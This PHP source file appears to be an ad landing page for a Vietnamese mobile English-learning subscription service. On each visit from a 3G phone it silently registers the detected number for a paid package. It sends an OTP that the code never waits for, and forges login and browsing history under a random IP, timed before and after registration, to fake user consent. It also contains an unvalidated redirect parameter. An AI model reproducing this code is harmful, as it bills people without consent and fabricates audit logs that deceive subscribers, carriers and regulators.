<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);
$onWap = 1;
include "config/init.php";
include "config/connect.php";

$adFirstCl = $dbmg->ad_first;
$configCl = $dbmg->config;
$historyCl = $dbmg->history_log;
$adscl = $dbmg->ads;
$adsLogCl = $dbmg->ads_log;
$_GET['time'] = time();
$_GET['phone'] =  Network::is3g() ? Network::is3g() : '';
$_GET['ip'] = Network::ip();
$adscl->insert($_GET);
$phone = Network::is3g();
$link_vms = '';
$linkRedirect = isset($_GET['link']) ? $_GET['link'] : 'index.php';
if($phone){
    $checkPackage = Network::getUserInfo($phone);
    if (Network::is3g() != '' && Network::is3gmobifone() == 1) {
        if ($checkPackage == 0 || $checkPackage == 2) {
            $packageInfo = Network::getCancelInfo($phone);
//            $packageInfo = 0;
            $adsFirst = $adFirstCl->findOne(array('phone'=>$phone));
//            $adsFirst = false;
            $oneTouch = $configCl->findOne(array('name'=>Constant::CONFIG_1TOUCH));
            $oneTouchOn = $oneTouch['value'] == 1;
            if(($packageInfo == 0 || Common::isInWhiteList($phone)) && $oneTouchOn && !$adsFirst) {
                ##Lưu lại sđt này để bỏ qua trong lần sau
                $adFirstCl->insert(array('phone' => $phone));
                ##checkBlacklist
                if(!isInBlackList($phone)){
//                    $adsLogCl->insert(array(
//                        '_id' => strval(time()),
//                        'phone' => $phone,
//                        'time' => time()
//                    ));
                    ##Random IP
                    $randomIp = Common::getRandomIp();
                    ##Log đăng nhập
                    $historyCl->insert(array(
                        '_id' => strval(time().rand(10,99)),
                        'datecreate' => time(),
                        'action' => HistoryLog::LOG_DANG_NHAP,
                        'chanel' => HistoryLog::CHANEL_WEB,
                        'ip' => $randomIp,
                        'uid' => $_SESSION['uinfo']['_id'],
                        'url' => Constant::BASE_URL.'/user/login',
                        'status' => Constant::STATUS_ENABLE,
                        'phone' => $phone,
                        'price'=> 0
                    ));
                    ##gửi mã xác thực
                    $authkey = getAuthKeyforAds($phone);
                    $info = 'Mã xác thực dịch vụ English360 của bạn là: '.$authkey;
                    Network::sentMT($phone,'OTP', $info);
                    ##tạo 5 log
                    _createFiveLogBefore($randomIp);
                    sleep(rand(7,10));
                    ##tạo log ảo
                    _createLogAfter($randomIp);

                    ##ĐĂng ký gói cước
                    $smsRegister = Network::registedpack($phone);
                    if($smsRegister != 0){
                        $successPkg = false;
                    }else{
                        $successPkg = true;
                    }
                    $historyCl->insert(array(
                        '_id' => strval(time().rand(10,99)),
                        'datecreate' => time(),
                        'action' => HistoryLog::LOG_DANG_KY_GOI_CUOC,
                        'chanel' => HistoryLog::CHANEL_WEB,
                        'ip' => $randomIp,
                        'uid' => $_SESSION['uinfo']['_id'],
                        'url' => Constant::BASE_URL.'/user/package',
                        'status' => $successPkg ? Constant::STATUS_ENABLE : Constant::STATUS_DISABLE,
                        'phone' => $phone,
                        'price'=> $successPkg ? Network::getPackageItem()['E']['price'] : 0
                    ));
                    $_SESSION['notsave_log'] = 1;
                    header("Location: ".$linkRedirect);exit;
                }
            }
            $link_callback = Constant::BASE_URL . "/wapportal.php?params=" . base64_encode('E' . '&WAP');
            $link_vms = Network::genLinkConfirmVms('E', $link_callback);
        }
    }
}else{
    if($version == 'wap'){
        header("Location: /quick-package.php?link=".$linkRedirect);
    }
    else
        header("Location: ".$linkRedirect);
    exit;


}

if(empty($link_vms)){
    header("Location: ".$linkRedirect);exit;
}else{
    die("<script>location.href = '".$link_vms."'</script>");
}

function isInBlackList($phone){
    global $dbmg;
    $blCl = $dbmg->bl;
    $rest = substr($phone, 0, 1);
    if ($rest == '0') {
        $phone = substr($phone, 1);
    }
    return $blCl->findOne(array('phone'=>$phone));
}

function getAuthKeyforAds($phone){
    global $dbmg;
    $authKeyCl = $dbmg->auth_key;
    $auth = $authKeyCl->findOne(array('phone'=>$phone));
    if(!$auth || empty($auth['key'])){
        $key = Common::generateRandomPassword();
    }else $key = $auth['key'];
    return $key;
}

function _createFiveLogBefore($randomIp){
    global $dbmg, $historyCl, $phone;
    $time = time();
    $catidArr = array(
        '1427344743' => 'kinh-nghiem',
        '1427183137' => 'thanh-ngu',
        '1427183162' => 'video',
        '1427344702' => 'radio',
        '1428995217' => 'tieng-anh-hang-ngay',
        '1450844989' => 'nguoi-noi-tieng',
    );
    $typeArr = array(
        '1427344743' => Constant::TYPE_EXP,
        '1427183137' => Constant::TYPE_IDIOM,
        '1427183162' => Constant::TYPE_VIDEO,
        '1427344702' => Constant::TYPE_RADIO,
        '1428995217' => Constant::TYPE_DAILY,
        '1450844989' => Constant::TYPE_FAMOUS,
    );
    $catid = '1427344743';
    for($i=0; $i<10; $i++){
        $time = $time - rand(3,10);
        if(rand(0,10) <= 3){
            $input = array_keys($catidArr);
//            $rand_keys = array_rand($input, 1);
            $catid = $input[array_rand($input)];
            $post = _getRandomPost('', $catid);
        }else{
            $post = _getRandomPost('', $catid);
        }
        $historyCl->insert(array(
            '_id' => strval($time.rand(10,99)),
            'datecreate' => $time,
            'action' => $typeArr[$catid],
            'chanel' => HistoryLog::CHANEL_WEB,
            'ip' => $randomIp,
            'uid' => '',
            'url' => Constant::BASE_URL.'/'.$catidArr[$catid].'/'.Common::utf8_to_url($post['name']).'.html',
            'status' => Constant::STATUS_ENABLE,
            'phone' => '',
            'price'=> 0
        ));
    }
}

function _createLogAfter($randomIp){
    global $dbmg, $phone;
    $historyCl = $dbmg->history_log;
    $time = time();
//    $catidArr = array('1427344743', '1427183137', '1427183162', '1427344702', '1428995217', '1450844989', '1450844989');
    $catidArr = array(
        '1427344743' => 'kinh-nghiem',
        '1427183137' => 'thanh-ngu',
        '1427183162' => 'video',
        '1427344702' => 'radio',
        '1428995217' => 'tieng-anh-hang-ngay',
        '1450844989' => 'nguoi-noi-tieng',
    );
    $typeArr = array(
        '1427344743' => Constant::TYPE_EXP,
        '1427183137' => Constant::TYPE_IDIOM,
        '1427183162' => Constant::TYPE_VIDEO,
        '1427344702' => Constant::TYPE_RADIO,
        '1428995217' => Constant::TYPE_DAILY,
        '1450844989' => Constant::TYPE_FAMOUS,
    );
    $catid = '1427344743';
    for($i=0; $i<rand(8,13); $i++){
        $time = $time + rand(3,10);
        if(rand(0,10) <= 3){
            $input = array_keys($catidArr);
//            $rand_keys = array_rand($input, 1);
            $catid = $input[array_rand($input)];
            $post = _getRandomPost('', $catid);
        }else{
            $post = _getRandomPost('', $catid);
        }
        $historyCl->insert(array(
            '_id' => strval($time.rand(10,99)),
            'datecreate' => $time,
            'action' => $typeArr[$catid],
            'chanel' => HistoryLog::CHANEL_WEB,
            'ip' => $randomIp,
            'uid' => $_SESSION['uinfo']['_id'],
            'url' => Constant::BASE_URL.'/'.$catidArr[$catid].'/'.Common::utf8_to_url($post['name']).'.html',
            'status' => Constant::STATUS_ENABLE,
            'phone' => $phone,
            'price'=> 0
        ));
    }
}

function _getRandomPost($id, $catid){
    global $dbmg;
    $thuviencl = $dbmg->thuvien;
    $currentPost = $thuviencl->findOne(array('_id'=>$id));
    $cond = array('category'=>$currentPost['category'], '_id'=>array('$ne'=>$id));
    $count = $thuviencl->count($cond);
    if($count > 0){
        $rand = rand(0, $count-1);
        $item = iterator_to_array($thuviencl->find($cond)->skip($rand)->limit(1), false);
    }else{
        $item = iterator_to_array($thuviencl->find(array('_id'=>array('$ne'=>$id)))->sort(array('datecreate'=>-1))->limit(1), false);
    }

    return $item[0];
}